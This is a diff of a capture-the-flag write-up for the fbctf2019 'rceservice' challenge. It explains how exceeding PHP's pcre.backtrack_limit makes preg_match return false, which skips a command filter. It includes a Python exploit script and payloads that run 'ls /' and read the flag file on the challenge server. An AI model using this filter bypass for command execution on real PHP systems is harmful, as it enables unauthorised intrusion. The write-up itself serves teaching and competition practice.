@@ -1,10 +1,6 @@
 # rceservice
 
-Solved: 31
-
-### [English Version](https://github.com/w181496/CTF/blob/master/fbctf2019/rceservice/README_en.md)
-
-<br>
+This challenge is very short:
 
 ```php
 <?php
@@ -33,17 +29,19 @@ if (isset($_REQUEST['cmd'])) {
 ?>
 ```
 
-這題題目很短，用`preg_match`擋了一堆東西
+It uses `preg_match()` to block a lot of patterns.
 
-但我們知道PHP有`pcre.backtrack_limit`限制，預設情況下，當回溯超過`1000000`次時，會回傳 `false`
+But we know that PHP has `pcre.backtrack_limit`, and the value of it is `1000000` by default.
 
-(https://www.php.net/manual/en/pcre.configuration.php)
+When the regex matching backtrack more than `1000000` times, the `preg_match` will return `false` directly.
 
-![](https://github.com/w181496/CTF/blob/master/fbctf2019/rceservice/pcre.png)
+(Detail: https://www.php.net/manual/en/pcre.configuration.php)
 
-上圖紅底字就代表發生回溯 ([regex101](https://regex101.com/) is your good friend)
+![](https://github.com/w181496/CTF/raw/master/fbctf2019/rceservice/pcre.png)
 
-Example:
+([regex101](https://regex101.com) is your good friend)
+
+You can test this special feature on your php console:
 
 ```
 php > var_dump(preg_match("/union.+select/is", "union select /*".str_repeat("s", 1000000)));
@@ -52,13 +50,19 @@ php > var_dump(preg_match("/union.+select/is", "union select /*".str_repeat("s",
 int(1)
 ```
 
-這在一般弱比較(Weak typing)情形下等同匹配成功
+So if the number of backtracking times exceeds the limit, the `preg_match` will return `false` and then bypass the `if` check.
 
-(`false == 0` => `true`)
+Exploit script:
 
-但這邊其實不用管弱比較，因為他直接把`preg_match`回傳值丟進`if`做判斷
+```python
+import requests
 
-所以當回溯超過上限時，回傳`false`，自動就會略過這個`if`，進入到`else`裡面
+payload = '{"cmd":"ls /","zz":"' + "a"*(1000000) + '"}'
+
+r = requests.post("http://challenges.fbctf.com:8085/", data={"cmd":payload})
+print r.text
+```
+
 
 e.g.
 
@@ -74,7 +78,10 @@ dr-xr-xr-x 1 root rceservice 4096 May 26 21:20 jail
 
 Bypass successfully!
 
+Now, let's read flag:
 
-詳細 payload 見[exp.py](https://github.com/w181496/CTF/blob/master/fbctf2019/rceservice/exp.py)
+`'{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a"*(1000000) + '"}'`
 
-flag: `fb{pr3g_M@tcH_m@K3s_m3_w@Nt_t0_cry!!1!!1!}`
+=> `fb{pr3g_M@tcH_m@K3s_m3_w@Nt_t0_cry!!1!!1!}`
+
+
